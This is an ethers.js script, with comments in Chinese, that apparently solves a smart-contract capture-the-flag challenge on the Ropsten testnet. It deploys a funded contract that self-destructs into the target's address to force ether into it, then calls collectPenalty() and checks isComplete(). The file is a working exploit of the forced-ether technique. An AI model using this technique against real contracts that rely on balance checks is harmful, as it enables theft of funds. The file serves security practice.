import {Contract, ethers, utils} from 'ethers';
import { INFURA_ROPSTEN_URL, privateKey } from '../constant.js';
import {contractabi, bytecode} from './utils.js';
const provider = new ethers.providers.JsonRpcProvider(INFURA_ROPSTEN_URL)
const wallet = new ethers.Wallet(privateKey, provider)


// 题目合约地址
const contractAdd = "0x35B37A7E215AEB697c0BFbdBf668907c6EaBE968";


const selfdestruct = async() =>{
    // 创建合约 转入 value 后直接销毁
    console.log("=============开始=================")
    const factoryself = new ethers.ContractFactory(contractabi,bytecode,wallet);
    let options = {
        value:ethers.utils.parseUnits("10000000", "gwei")
    };

    const cself = await factoryself.deploy(options);
    console.log(`合约地址 : ${cself.address}`);
    console.log('部署合约');
    console.log(await cself.deployTransaction.wait(),"\n等待合约部署上链");
    await cself.deployed();


    console.log("合约部署后的 余额为：", ethers.utils.formatEther(await cself.getBalance()));
    
    let options2 = {
        gasLimit:ethers.utils.parseUnits("3000000", "wei")
    };
    let tx2 = await cself.kill(contractAdd,  options2);

    await tx2.wait();

    console.log(tx2);


    console.log("合约自毁完毕！！！！！！！！！！！！！！")





}
// selfdestruct();

const main = async()=>{

    const contractABI = [
        "    function isComplete() public view returns (bool) ",
        "    function collectPenalty() public "
    ];
    
    const contractA = new ethers.Contract(contractAdd,contractABI, wallet);

    let recepit = await contractA.collectPenalty();
    recepit.wait();
    console.log(recepit);

    let sign = await contractA.isComplete();

    console.log("标志===",sign);


    console.log("程序运行完毕！！！！");
    


}
main();

